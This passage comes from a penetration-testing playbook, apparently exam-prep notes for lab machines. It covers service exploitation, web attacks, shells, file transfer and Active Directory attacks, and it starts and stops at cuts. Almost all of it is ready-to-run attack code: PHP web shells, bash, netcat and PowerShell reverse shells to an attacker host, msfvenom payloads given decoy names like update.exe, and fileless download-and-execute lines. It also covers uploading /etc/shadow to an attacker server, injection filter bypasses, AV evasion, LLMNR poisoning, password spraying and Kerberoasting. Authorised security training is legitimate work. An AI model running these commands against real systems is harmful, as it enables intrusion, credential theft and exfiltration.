│  ├─ STEP 2: Hash dump → msf: use auxiliary/scanner/ipmi/ipmi_dumphashes
│  ├─ STEP 3: Try defaults → Dell iDRAC: root/calvin, Supermicro: ADMIN/ADMIN
│  └─ IF you get access → full BMC control: reboot, power off, reinstall OS
```

**NEXT:** IF hashes dumped → crack offline. IF default creds work → full host control.

---

## 4.13 PORTS 873, 512, 513, 514 — Rsync & R-Services

**Rsync (873):**
```bash
sudo nmap -sV -p873 $IP
nc -nv $IP 873                    # probe
rsync -av --list-only rsync://$IP/dev   # enumerate
rsync -av rsync://$IP/dev          # sync files
```

**R-Services (512/513/514) — legacy, trust-based:**
```bash
sudo nmap -sV -p512,513,514 $IP
rlogin $IP -l user                 # login without password (if trusted)
rwho                               # list logged-in users
rusers -al $IP                     # detailed user info
```

---

## 4.14 PORTS 3389, 5985/5986, 135 — Windows Remote Management

**RDP (3389):**
```
┌─ FOUND PORT 3389 (RDP)?
│  ├─ STEP 1: Try found credentials → xfreerdp /u:user /p:'pass' /v:$IP /cert:ignore
│  ├─ STEP 2: IF RDP works → check for additional NICs (ipconfig /all)
│  ├─ STEP 3: IF new network → pivot → Section 9
│  └─ STEP 4: For RDP through proxy → proxychains xfreerdp /u:user /p:'pass' /v:$IP /cert:ignore
```

**Optimized xfreerdp (for slow connections):**
```bash
xfreerdp /u:user /p:'pass' /v:$IP /cert-ignore /bpp:8 /network:modem /compression -themes -wallpaper /clipboard /audio-mode:1 /auto-reconnect -glyph-cache /dynamic-resolution
```

**WinRM (5985/5986):**
```bash
evil-winrm -i $IP -u user -p pass
```

**WMI (135):**
```bash
wmiexec.py user:"pass"@$IP "whoami"
```

**NEXT:** IF you get in → enumerate host → check NICs → Section 10 (PrivEsc) → Section 9 (pivot if new network)

---

**→ END OF SECTION 4. After service attacks:**
- **IF shell obtained →** Section 6 (stabilize) → Section 7 (transfer tools) → Section 10 (PrivEsc)
- **IF credentials obtained →** try on ALL services → Section 8 (if AD) → Section 10 (PrivEsc)
- **IF new network discovered →** Section 9 (pivot) → Section 3 (scan new subnet)
- **IF web found →** Section 5 (full web attack chain)

---

# ═══════════════════════════════════════════════════════════
# SECTION 5: WEB APPLICATION ATTACKS
# ═══════════════════════════════════════════════════════════

## 5.1 DECISION: What Web Attack Path?

```
┌─ FOUND PORT 80/443 (HTTP/HTTPS)?
│  │
│  ├─ ALWAYS DO FIRST:
│  │  ├─ curl -I http://$IP          → check headers
│  │  ├─ whatweb $IP                 → identify tech stack
│  │  └─ View source code            → check comments, hidden fields
│  │
│  ├─ IF source code has comments/hidden paths → investigate those FIRST
│  ├─ IF robots.txt exists → check it
│  ├─ IF CMS detected → go to Section 5.4 (CMS attacks)
│  ├─ IF login form → go to Section 5.5 (auth attacks)
│  ├─ IF file upload → go to Section 5.6 (upload attacks)
│  ├─ IF URL parameters → go to Section 5.7 (LFI, injection)
│  │
│  └─ ALWAYS RUN:
│     ├─ gobuster/ffuf directory enum → Section 5.2
│     └─ gobuster/ffuf vHost enum → Section 5.3
```

---

## 5.2 Directory & File Enumeration

**WHEN:** ALWAYS on every web server.

**WHY:** Hidden directories contain admin panels, API endpoints, backup files, and configuration files.

**HOW:**
```bash
# Gobuster (reliable, well-tested)
gobuster dir -u http://$IP/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -e -k

# ffuf (faster, more flexible)
ffuf -u http://$IP/FUZZ -w common.txt -e .php,.txt,.html,.js,.bak,.old -mc 200,301,302,403
```

**WHAT to look for:**
- `/admin`, `/login`, `/dashboard` → authentication attacks
- `/api/`, `/graphql` → API testing
- `/backup/`, `/old/`, `/dev/` → configuration files with creds
- `/.env`, `/wp-config.php`, `/config.php` → credentials
- `/robots.txt` → hidden paths
- Any `README` → version info → search for exploits

**NEXT:** For each interesting directory found → investigate → Section 5.5/5.6/5.7 as applicable

---

## 5.3 Virtual Host Discovery

**WHEN:** You suspect multiple sites on one IP (common in exam scenarios).

**WHY:** Web servers host multiple sites. The default page shows nothing, but vHosts have full applications. Internal domains (`.local`, `.htb`) won't resolve in DNS — you must discover them via Host header fuzzing.

**HOW:**
```bash
# gobuster vhost
gobuster vhost -u http://$IP -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --domain inlanefreight.htb --append-domain -t 50

# ffuf (Host header fuzzing)
ffuf -u http://$IP -w subdomains.txt -mc 200,403 -H "Host: FUZZ.inlanefreight.htb" -ac
```

**IF you find a vHost →** add to `/etc/hosts` → treat as new target → go back to Section 5.1

---

## 5.4 CMS-Specific Attacks

**WHEN:** whatweb/gobuster identifies a CMS.

```
┌─ What CMS?
│  ├─ WordPress → wpscan --url http://$IP --enumerate u,p,t
│  │   ├─ Users → password spray
│  │   ├─ Plugins → search exploits
│  │   └─ Themes → edit theme → inject PHP shell
│  ├─ Joomla → joomscan -u http://$IP
│  └─ Other → searchsploit <cms_name> <version>
```

---

## 5.5 Authentication Attacks

**WHEN:** You find a login form.

**HOW — in order:**
1. **Default credentials** → admin:admin, admin:password, admin:<cms_name>
2. **SQLi bypass** → `' OR 1=1 -- -` in username/password
3. **Brute force** → hydra/burp (if no lockout)
4. **Password spray** → if you have username list from recon

**Lab pattern:** The Knowledge Check machine had admin:admin working immediately. Always try defaults first.

**NEXT:** IF logged in → explore all functionality → look for file upload, command execution, theme editing

---

## 5.6 File Upload & Web Shell Deployment

**WHEN:** You find a file upload feature OR you have admin access to a CMS.

**WHY:** Web shells give persistent code execution through the web server.

**HOW — deploy web shell:**
```php
<?php system($_REQUEST["cmd"]); ?>
```

```bash
# Via upload feature (if found)
# Via theme editing (WordPress/Joomla admin)
# Via direct write (if you have filesystem access)
echo '<?php system($_REQUEST["cmd"]); ?>' > /var/www/html/shell.php
```

**Default webroot paths:**
| Server | Path |
|--------|------|
| Apache | `/var/www/html/` |
| Nginx | `/usr/local/nginx/html/` |
| IIS | `c:\inetpub\wwwroot\` |
| XAMPP | `C:\xampp\htdocs\` |

**Access web shell:**
```bash
curl http://$IP/shell.php?cmd=id
# Or visit in browser: http://$IP/shell.php?cmd=whoami
```

**NEXT:** IF web shell works → upgrade to reverse shell → Section 6.4

---

## 5.7 LFI/RFI & Injection Attacks

```
┌─ FOUND URL PARAMETERS?
│  ├─ Test EVERY parameter for LFI: ?page=../../../../etc/passwd
│  │  ├─ IF LFI works:
│  │  │   ├─ PHP filter base64 → php://filter/read=convert.base64-encode/resource=config
│  │  │   ├─ RCE via data wrapper → data://text/plain;base64,PAYLOAD&cmd=id
│  │  │   └─ Log poisoning → inject PHP in User-Agent → include /var/log/apache2/access.log
│  │  └─ IF you get file read → read /etc/passwd, /etc/shadow, config files, .env
│  │
│  ├─ Test for command injection: ;id, |whoami, $(id)
│  │  ├─ IF spaces blocked → ${IFS} or %09
│  │  ├─ IF slashes blocked → ${PATH:0:1}
│  │  └─ IF blacklist → w'h'o'am'i or $(rev<<<'imaohw')
│  │
│  └─ Test for SQLi: ' OR 1=1 -- -, sqlmap -u "http://$IP/page?param=val" --batch
```

**NEXT:** IF any injection works → get reverse shell → Section 6.4

---

## 5.8 Admin Panel Theme Editing → RCE (Exam-Critical Pattern)

**WHEN:** You have admin access to a CMS with editable themes.

**WHY:** Themes are written in server-side code (PHP, ASPX). Editing a theme = editing server-side code = code execution.

**Lab pattern (Knowledge Check):** Admin login → Themes section → edit PHP theme file → insert PHP reverse shell → got connection on Netcat listener.

**HOW:**
1. Navigate to theme editor
2. Select any theme file (PHP)
3. Replace content with reverse shell:
   ```php
   <?php exec("bash -c 'bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1'"); ?>
   ```
4. Save and visit the theme page → shell connects back

**NEXT:** → Section 6.5 (TTY stabilization) → Section 10 (PrivEsc)

---

## 5.9 "I'm Stuck on Web" Recovery Loop

```
┌─ Nothing working on the web app?
│  ├─ Re-enumerate with DIFFERENT wordlist
│  ├─ Check source code again for missed comments
│  ├─ Try vHost discovery (Section 5.3)
│  ├─ Check every parameter for LFI/injection
│  ├─ Check every upload point
│  ├─ Try default creds on every login form
│  ├─ Check robots.txt, sitemap.xml, .git/
│  └─ Check HTTP headers (curl -I) for interesting info
```

---

## 5.10 Automated Recon — FinalRecon

**WHEN:** You want a quick automated scan alongside manual testing.

```bash
git clone https://github.com/thewhiteh4t/FinalRecon.git
cd FinalRecon && pip3 install -r requirements.txt
./finalrecon.py http://$IP
```

---

**→ END OF SECTION 5. IF you got web shell/reverse shell → Section 6.5 (TTY stabilize). IF nothing → try other ports' sections in Phase 4.**

---

# ═══════════════════════════════════════════════════════════
# SECTION 6: INITIAL ACCESS & SHELLS
# ═══════════════════════════════════════════════════════════

## 6.1 DECISION: How to Get Your Shell?

```
┌─ HOW did you get access?
│  ├─ IF via vulnerability exploit → you may already have a shell
│  ├─ IF via web shell → upgrade to reverse shell → Section 6.4
│  ├─ IF via MSSQL xp_cmdshell → send reverse shell → Section 6.4
│  ├─ IF via credentials + SSH → you have an interactive shell → Section 6.5
│  └─ IF via Metasploit exploit → Meterpreter session → Section 9.3
```

---

## 6.2 Public Exploit Discovery

**WHEN:** You identified a service version with known vulnerabilities.

**HOW:**
```bash
# Search Exploit-DB
searchsploit <service> <version>

# Metasploit
msfconsole
search exploit <vulnerability_name>
use exploit/<path>
set RHOSTS $IP
# Set other required options
run
```

**Lab pattern (Nibble Walkthrough):** Found NibbleBlog v4.0.3 → searchsploit → Metasploit module → set options → run → got shell.

---

## 6.3 MSFVenom Payload Generation

**WHEN:** You need a custom payload for a specific target.

**WHY — Staged vs Stageless:**
- **Staged** (`windows/meterpreter/reverse_tcp` with `/`): Payload delivered in stages — smaller initial payload, needs reliable connection
- **Stageless** (`windows/meterpreter_reverse_tcp` with `_`): Entire payload at once — more reliable, larger file

```
┌─ What's the target OS?
│  ├─ IF Linux:
│  │   ├─ ELF reverse shell → msfvenom -p linux/x64/shell_reverse_tcp LHOST=$LHOST LPORT=443 -f elf > backup.elf
│  │   └─ Meterpreter → msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=$LHOST LPORT=8123 -f elf > backupjob
│  │
│  ├─ IF Windows:
│  │   ├─ EXE reverse → msfvenom -p windows/shell_reverse_tcp LHOST=$LHOST LPORT=443 -f exe > update.exe
│  │   ├─ Meterpreter HTTPS → msfvenom -p windows/x64/meterpreter/reverse_https LHOST=$LHOST LPORT=8080 -f exe > update.exe
│  │   └─ Bind shell → msfvenom -p windows/x64/meterpreter/bind_tcp LPORT=8443 -f exe > backup.exe
│  │
│  └─ IF web server:
│      └─ PHP → msfvenom -p php/reverse_php LHOST=$LHOST LPORT=$LPORT -f raw > shell.php
```

**IMPORTANT:** Set up Netcat listener BEFORE executing payload:
```bash
nc -nvlp 443    # port must match LPORT in payload
```

---

## 6.4 Shell Types — When to Use Each

```
┌─ What's the network situation?
│  ├─ IF firewall blocks INBOUND connections to target → use REVERSE shell (most common)
│  │   └─ Target connects back to you (outbound usually allowed)
│  ├─ IF firewall blocks OUTBOUND from target → use BIND shell
│  │   └─ Target listens, you connect in
│  └─ IF you only have web access → use WEB SHELL
│      └─ Runs on web port, no new ports needed, persistent across reboots
```

**Reverse Shell Commands (most reliable):**
```bash
# Bash
bash -c 'bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1'

# Named pipe (works when bash /dev/tcp blocked)
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f|/bin/sh -i 2>&1|nc $LHOST $LPORT >/tmp/f

# PowerShell (Windows) — the one that worked in assessment
$client = New-Object System.Net.Sockets.TCPClient('$LHOST',$LPORT)
$stream = $client.GetStream()
[byte[]]$bytes = 0..65535|%{0}
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i)
    $sendback = (iex $data 2>&1 | Out-String)
    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> '
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
    $stream.Write($sendbyte,0,$sendbyte.Length)
    $stream.Flush()
}
$client.Close()
```

**Bind Shell:**
```bash
# Server side (on target)
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -lvp 7777 > /tmp/f
# Connect from attacker
nc -nv $IP 7777
```

---

## 6.5 TTY Stabilization — ALWAYS Do This After Getting a Shell

**WHEN:** IMMEDIATELY after getting any non-interactive shell (Netcat, web shell, etc.).

**WHY:** Basic shells lack line editing, history, tab completion, and break with interactive commands (su, nano, vim, mysql client).

**HOW — the complete method:**
```bash
# Step 1: Spawn a PTY
python3 -c 'import pty; pty.spawn("/bin/bash")'

# Step 2: Background the shell — press Ctrl+Z

# Step 3: Fix your LOCAL terminal (on YOUR machine, not the target)
stty raw -echo

# Step 4: Foreground the shell — type: fg
# Press Enter twice

# Step 5: Fix terminal environment (on TARGET)
export TERM=xterm-256color
stty size           # note the rows and columns
stty rows 50 columns 200    # set to match
```

**Alternative shell spawning:**
```bash
/bin/bash -i
/bin/sh -i
```

**NEXT:** → Section 7 (file transfers) → get enumeration tools onto target

---

**→ END OF SECTION 6. You have a stable shell → Section 7 (file transfers + enumeration).**

---

# ═══════════════════════════════════════════════════════════
# SECTION 7: POST-EXPLOITATION — FILE TRANSFERS
# ═══════════════════════════════════════════════════════════

## 7.1 DECISION: How to Transfer Files?

```
┌─ What's your target OS and available protocols?
│  │
│  ├─ IF Linux target:
│  │   ├─ IF HTTP outbound allowed → wget/cURL (easiest) → Section 7.2
│  │   ├─ IF SSH available → SCP → Section 7.2
│  │   ├─ IF nothing works → Base64 copy-paste → Section 7.2
│  │   └─ Need to UPLOAD from target → python3 uploadserver → Section 7.2
│  │
│  ├─ IF Windows target:
│  │   ├─ IF HTTP/HTTPS allowed → PowerShell → Section 7.3
│  │   ├─ IF SMB allowed → impacket-smbserver → Section 7.3
│  │   ├─ IF WinRM → PowerShell Session → Section 7.5
│  │   ├─ IF RDP session → drive redirection → Section 7.3
│  │   ├─ IF nothing works → certutil/bitsadmin (LOLBAS) → Section 7.6
│  │   └─ Need to UPLOAD → uploadserver + PSUpload.ps1 or WebDAV → Section 7.3
│  │
│  └─ ALWAYS verify: md5sum on BOTH sides must match
```

---

## 7.2 Linux File Transfers

### Downloading TO Target

```
┌─ What's available on the target?
│  ├─ IF wget available → wget http://$LHOST/file -O /tmp/file
│  ├─ IF curl available → curl http://$LHOST/file -o /tmp/file
│  ├─ IF neither but has bash → exec 3<>/dev/tcp/$LHOST/80; echo -e "GET /file HTTP/1.1\n\n">&3; cat <&3
│  ├─ IF SSH available → scp user@$LHOST:/path/file /tmp/file
│  ├─ IF nothing works → Base64:
│  │   # On attacker: base64 -w 0 < file
│  │   # On target: echo "base64string" | base64 -d > file
│  └─ ALWAYS verify: md5sum file (compare both sides)
```

**Fileless execution (download and run in memory — no file on disk):**
```bash
curl https://example.com/linpeas.sh | bash
wget -qO- https://example.com/script.py | python3
```

### Uploading FROM Target
```bash
# Python upload server on attacker
python3 -m pip install uploadserver
python3 -m uploadserver

# From target
curl -X POST http://$LHOST:8000/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow'

# Alternative servers
python3 -m http.server 8000      # download only
php -S 0.0.0.0:8000              # download only
ruby -run -ehttpd . -p8000       # download only
```

---

## 7.3 Windows File Transfers

### Downloading TO Target

```
┌─ What's available on the Windows target?
│  ├─ IF PowerShell 3+ → Invoke-WebRequest http://$LHOST/file -OutFile file
│  │   ├─ IF SSL error → [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
│  │   └─ IF IE config error → -UseBasicParsing
│  ├─ IF older PowerShell → (New-Object Net.WebClient).DownloadFile('http://$LHOST/file','C:\file')
│  ├─ IF fileless needed → IEX (New-Object Net.WebClient).DownloadString('http://$LHOST/script.ps1')
│  ├─ IF SMB allowed → impacket-smbserver on attacker → copy \\$LHOST\share\file
│  ├─ IF FTP → (New-Object Net.WebClient).DownloadFile('ftp://$LHOST/file','C:\file')
│  ├─ IF LOLBAS needed → certutil -urlcache -split -f http://$LHOST/file
│  │   OR → bitsadmin /transfer job http://$LHOST/file C:\file
│  └─ IF RDP with drive → xfreerdp /drive:loot,/path → copy from \\tsclient\loot\
```

### Uploading FROM Target
```powershell
# Via uploadserver + PSUpload.ps1
IEX(New-Object Net.WebClient).DownloadString('http://$LHOST/PSUpload.ps1')
Invoke-FileUpload -Uri http://$LHOST:8000/upload -File C:\path\to\file

# Via WebDAV (wsgidav on attacker)
copy C:\file \\$LHOST\DavWWWRoot\

# Via FTP (pyftpdlib --write on attacker)
(New-Object Net.WebClient).UploadFile('ftp://$LHOST/file', 'C:\file')

# Via Base64 (no network)
[Convert]::ToBase64String((Get-Content -path "C:\file" -Encoding byte))
# Decode on attacker: echo "b64string" | base64 -d > file
```

### Evasion — Change User Agent
```powershell
$UserAgent = [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome
Invoke-WebRequest http://$LHOST/nc.exe -UserAgent $UserAgent -OutFile "C:\Users\Public\nc.exe"
```

---

## 7.4 Netcat/Ncat File Transfers

```
┌─ Which direction?
│  ├─ Attacker → Target:
│  │   # Target: ncat -l -p 8000 --recv-only > file.exe
│  │   # Attacker: nc -q 0 $TARGET_IP 8000 < file.exe
│  │
│  └─ Target → Attacker:
│      # Attacker: nc -l -p 443 -q 0 < file.exe  (or ncat --send-only)
│      # Target: nc $ATTACKER_IP 443 > file.exe
```

---

## 7.5 PowerShell Session File Transfer (WinRM)

**WHEN:** You have WinRM access between two Windows hosts.

**WHY:** Native PowerShell remoting — no additional tools needed, works through firewalls.

```powershell
# Verify WinRM
Test-NetConnection -ComputerName TARGET -Port 5985

# Create session
$Session = New-PSSession -ComputerName TARGET

# Push file TO remote
Copy-Item -Path C:\local\file.txt -ToSession $Session -Destination C:\remote\

# Pull file FROM remote
Copy-Item -Path "C:\remote\file.txt" -Destination C:\ -FromSession $Session
```

---

## 7.6 Living Off The Land (LOLBAS/GTFOBins)

**WHEN:** AV/EDR blocks your normal transfer methods.

**WHY:** These are legitimate system binaries — they won't be blocked.

### Windows LOLBAS
```cmd
# certutil (download)
certutil.exe -verifyctl -split -f http://$LHOST/file.exe

# bitsadmin (download)
bitsadmin /transfer job /priority foreground http://$LHOST/file.exe C:\file.exe

# certreq (upload to attacker)
certreq.exe -Post -config http://$LHOST:8000/ c:\windows\win.ini
```

### Linux GTFOBins
```bash
# OpenSSL transfer
# Attacker: openssl s_server -quiet -accept 80 -cert cert.pem -key key.pem < file_to_send
# Target: openssl s_client -connect $ATTACKER_IP:80 -quiet > received_file
```

---

## 7.7 File Encryption (for Sensitive Data)

**WHEN:** Exfiltrating sensitive data (passwords, hashes, configs) — encrypt in transit.

**Linux:**
```bash
openssl enc -aes256 -iter 100000 -pbkdf2 -in sensitive.txt -out sensitive.enc
# Decrypt: openssl enc -d -aes256 -iter 100000 -pbkdf2 -in sensitive.enc -out sensitive.txt
```

**Windows:**
```powershell
Import-Module Invoke-AESEncryption.ps1
Invoke-AESEncryption -Mode Encrypt -Key "p4ssw0rd" -Path .\sensitive.txt
```

---

**→ END OF SECTION 7. Files transferred → enumerate the host → Section 10 (PrivEsc).**

---

# ═══════════════════════════════════════════════════════════
# SECTION 8: ACTIVE DIRECTORY ENUMERATION & ATTACKS
# ═══════════════════════════════════════════════════════════

## 8.1 DECISION: Where Are You in the AD Attack Chain?

```
┌─ What's your current position in the AD environment?
│  │
│  ├─ IF you have NO credentials → follow PATH A (Section 8.2)
│  │   └─ LLMNR/NBT-NS poisoning, password spraying, Kerbrute
│  │
│  ├─ IF you HAVE credentials → follow PATH B (Section 8.3)
│  │   └─ Enumerate with CME, BloodHound, PowerView, windapsearch
│  │
│  ├─ IF you need to LATERAL MOVE → follow PATH C (Section 8.4)
│  │   └─ Kerberoasting, AS-REP roasting, pass-the-hash, psexec/wmiexec
│  │
│  └─ IF you have DOMAIN ADMIN → follow PATH D (Section 8.5)
│      └─ DCSync, full domain compromise
```

---

## PATH A: No Credentials — Initial AD Access

## 8.2 LLMNR/NBT-NS Poisoning

**WHEN:** You're on an internal network with NO credentials. ALWAYS start this immediately.

**WHY:** When DNS fails, Windows broadcasts name resolution requests (LLMNR on 5355, NBT-NS on 137). ANY host can reply. Responder poisons the response, victim sends NTLMv2 hash to you.

**HOW:**
```bash
# Start Responder — DO THIS IN A TMUX WINDOW AND LEAVE RUNNING
sudo responder -I tun0 -dwv
# -w: WPAD rogue proxy (captures all HTTP from IE users)
# -f: Fingerprint OS
# -d: Enable DHCP server name resolution

# Analyze-only mode (passive, no poisoning)
sudo responder -I tun0 -A
```

**WHAT to look for:** NTLMv2 hashes in `/usr/share/responder/logs/`

**NEXT — IF hash captured:**
```
┌─ What hash type?
│  ├─ IF NTLMv2 → crack offline → hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
│  │   └─ IF cracked → try credentials → PATH B
│  └─ IF SMB signing disabled → consider SMB relay (advanced, separate module)
```

**Windows alternative — Inveigh:**
```powershell
# PowerShell version
Import-Module .\Inveigh.ps1
Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y

# C# version
.\Inveigh.exe
# Press Escape for console → GET NTLMV2UNIQUE / GET NTLMV2USERNAMES
```

---

## 8.3 Password Policy Enumeration (No Creds)

**WHEN:** You need to know lockout thresholds before spraying passwords.

```
┌─ How?
│  ├─ SMB null session → rpcclient -U "" -N $IP → querydominfo
│  ├─ enum4linux → enum4linux -P $IP
│  ├─ enum4linux-ng → enum4linux-ng -P $IP -oA output
│  └─ LDAP anonymous bind → ldapsearch -h $IP -x -b "DC=DOMAIN,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength
```

**From Windows:**
```powershell
net accounts              # local policy
net accounts /domain      # domain policy
```

---

## 8.4 User List Generation (No Creds)

**WHEN:** You need valid usernames for password spraying.

```
┌─ How?
│  ├─ SMB null session:
│  │   ├─ enum4linux -U $IP | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"
│  │   ├─ rpcclient -U "" -N $IP → enumdomusers
│  │   └─ nxc smb $IP --users
│  │
│  ├─ LDAP anonymous:
│  │   └─ ldapsearch -h $IP -x -b "DC=DOMAIN,DC=LOCAL" -s sub "(&(objectclass=user))" | grep sAMAccountName: | cut -f2 -d" "
│  │
│  └─ Kerbrute (Kerberos pre-auth — STEALTHIEST):
│      └─ kerbrute userenum -d domain.local --dc $DC_IP users.txt
# Why stealthiest: Does NOT generate Event ID 4625 (Account Logon Failure) — traditional logon failures ARE monitored/alerted on
```

**NEXT:** With user list → Section 8.6 (Password Spraying)

---

## 8.5 Password Spraying

**WHEN:** You have a user list but no passwords.

**WHY:** Try ONE password against MANY users — avoids account lockout (brute force tries MANY passwords against ONE user = triggers lockout).

```
┌─ What OS are you attacking from?
│  ├─ IF Linux:
│  │   ├─ Kerbrute (stealthiest — no Event ID 4625):
│  │   │   └─ kerbrute passwordspray -d domain.local --dc $DC_IP users.txt Welcome1
│  │   ├─ CrackMapExec (filter successes):
│  │   │   └─ sudo crackmapexec smb $DC -u users.txt -p Password123 | grep +
│  │   └─ rpcclient loop:
│  │       └─ for u in $(cat users.txt); do rpcclient -U "$u%Welcome1" -c "getusername;quit" $DC | grep Authority; done
│  │
│  └─ IF Windows (domain-joined):
│      └─ DomainPasswordSpray:
│          Import-Module .\DomainPasswordSpray.ps1
│          Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
# Auto-generates user list from AD, excludes accounts near lockout threshold
```

**Local Admin Spraying (WARNING — critical):**
```bash
# ALWAYS use --local-auth to prevent domain-wide lockouts!
sudo crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +
```

**Password Pattern Reuse:**
- IF local admin `$desktop%@admin123` cracked → try `$server%@admin123` on servers
- IF domain user `ajones` found → try `ajones_adm` admin account
- IF NTLM hash from local SAM → spray across subnet with `--local-auth`
- IF domain trust → creds from Domain A may work in Domain B

**NEXT:** IF credentials found → PATH B (credentialed enumeration)

---

## PATH B: Have Credentials — AD Enumeration

## 8.6 Credentialed Enumeration — From Linux

```
┌─ You have valid domain credentials. What to enumerate?
│  │
│  ├─ Users: crackmapexec smb $DC -u user -p pass --users
│  ├─ Groups: crackmapexec smb $DC -u user -p pass --groups
│  ├─ Logged-on users: crackmapexec smb $DC -u user -p pass --loggedon-users
│  ├─ Shares: crackmapexec smb $DC -u user -p pass --shares
│  │   └─ Spider shares: crackmapexec smb $DC -u user -p pass -M spider_plus --share 'ShareName'
│  │       Results → /tmp/cme_spider_plus/<IP>/
│  │
│  ├─ SMB shares (alternative): smbmap -u user -p pass -d DOMAIN -H $DC
│  │   └─ Recursive dir: smbmap -u user -p pass -d DOMAIN -H $DC -R 'Share' --dir-only
│  │
│  ├─ Domain Admins: python3 windapsearch.py --dc-ip $DC -u user@domain -p pass --da
│  ├─ Privileged Users: python3 windapsearch.py --dc-ip $DC -u user@domain -p pass -PU
│  │
│  ├─ BloodHound (full AD mapping):
│  │   sudo bloodhound-python -u 'user' -p 'pass' -ns $DC -d domain.local -c all
│  │   # Generates: *_users.json, *_groups.json, *_computers.json, *_domains.json
│  │   # Upload to BloodHound GUI: sudo neo4j start → bloodhound → upload → analyze
│  │
│  └─ Remote execution:
│      ├─ psexec.py domain/user:'pass'@$IP  (requires local admin, uploads to ADMIN$)
│      └─ wmiexec.py domain/user:'pass'@$IP  (no file drop, fewer logs via WMI)
```

---

## 8.7 Credentialed Enumeration — From Windows

```
┌─ What tool to use?
│  │
│  ├─ ActiveDirectory module:
│  │   Import-Module ActiveDirectory
│  │   Get-ADDomain                    → domain info
│  │   Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName  → Kerberoast candidates
│  │   Get-ADTrust -Filter *           → trust relationships
│  │   Get-ADGroup -Filter *           → all groups
│  │   Get-ADGroupMember -Identity "Domain Admins" -Recurse  → recursive DA members
│  │
│  ├─ PowerView (stealthier — no file drop):
│  │   Get-DomainUser -Identity user -Domain domain | Select-Object name,samaccountname,description,memberof,pwdlastset,serviceprincipalname
│  │   Get-DomainGroupMember -Identity "Domain Admins" -Recurse
│  │   Get-DomainTrustMapping
│  │   Test-AdminAccess -ComputerName TARGET
│  │   Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName  → Kerberoast candidates
│  │
│  ├─ SharpView (.NET — even stealthier):
│  │   .\SharpView.exe Get-DomainUser -Identity user
│  │
│  ├─ BloodHound data collection:
│  │   .\SharpHound.exe -c All --zipfilename OUTPUT
│  │
│  └─ Snaffler (credential hunting):
│      .\Snaffler.exe -s -d domain.local -o snaffler.log -v data
```

---

## 8.8 Living Off The Land — AD Enumeration (dsquery + Net Commands)

**WHEN:** You want to avoid dropping tools on the target.

**dsquery with LDAP filters:**
```powershell
# All objects in container
dsquery * "CN=Users,DC=DOMAIN,DC=LOCAL"

# Users with PASSWD_NOTREQD (no password required — UAC flag 32)
dsquery * -filter "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))" -attr distinguishedName

# Domain Controllers (UAC flag 8192)
dsquery * -filter "(userAccountControl:1.2.840.113556.1.4.803:=8192)" -attr sAMAccountName

# Users with password never expires (65536)
dsquery * -filter "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=65536))" -attr sAMAccountName

# Disabled accounts (2)
dsquery * -filter "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=2))" -attr sAMAccountName
```

**OID Matching Rules:**
| OID | Rule | Use When |
|-----|------|----------|
| `1.2.840.113556.1.4.803` | BIT_AND | ALL specified bits must be set (one specific flag) |
| `1.2.840.113556.1.4.804` | BIT_OR | ANY of the bits can be set (multiple flags possible) |
| `1.2.840.113556.1.4.1941` | IN_CHAIN | Recursive DN search (nested group membership) |

**Net commands (use `net1` instead of `net` to bypass string detection):**
```cmd
net user /domain                     # all domain users
net user username /domain            # specific user info
net group /domain                    # all domain groups
net group "Domain Admins" /domain    # DA members
net localgroup administrators /domain  # domain admins in local admin
net accounts /domain                 # domain password policy
net view                             # list computers
net view /domain                     # PCs in domain
```

---

## 8.9 Security Control Enumeration — BEFORE You Tool Up

**WHEN:** IMMEDIATELY after getting Windows access, BEFORE running enumeration tools.

**WHY:** PowerView, BloodHound, Mimikatz etc. will be blocked by Defender/AppLocker. Know what's in place first.

```powershell
# Windows Defender
Get-MpComputerStatus
# Key fields: RealTimeProtectionEnabled, AntivirusEnabled, BehaviorMonitorEnabled

# AppLocker
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
# Look for: alternate PS paths not blocked (SysWOW64\WindowsPowerShell\v1.0\powershell.exe)

# PowerShell Language Mode
$ExecutionContext.SessionState.LanguageMode
# FullLanguage = good. ConstrainedLanguage = many tools will break

# LAPS
Find-LAPSDelegatedGroups          # who can read LAPS passwords
Find-AdmPwdExtendedRights          # users with "All Extended Rights"
Get-LAPSComputers                 # read LAPS passwords (if you have access)
```

---

## PATH C: Lateral Movement with Credentials

## 8.10 Kerberoasting

**WHEN:** You have ANY domain user account.

**WHY:** Any domain user can request Kerberos TGS tickets for accounts with SPNs. The tickets are encrypted with the service account's NTLM hash — crack offline. Service accounts are often highly privileged with weak passwords.

```
┌─ How to Kerberoast?
│  │
│  ├─ From Linux ( GetUserSPNs.py ):
│  │   # List SPN accounts
│  │   GetUserSPNs.py -dc-ip $DC DOMAIN.LOCAL/user:pass
│  │
│  │   # Request TGS tickets
│  │   GetUserSPNs.py -dc-ip $DC DOMAIN.LOCAL/user:pass -request
│  │
│  │   # Single target
│  │   GetUserSPNs.py -dc-ip $DC DOMAIN.LOCAL/user:pass -request-user sqldev -outputfile sqldev_tgs
│  │
│  │   # Crack offline
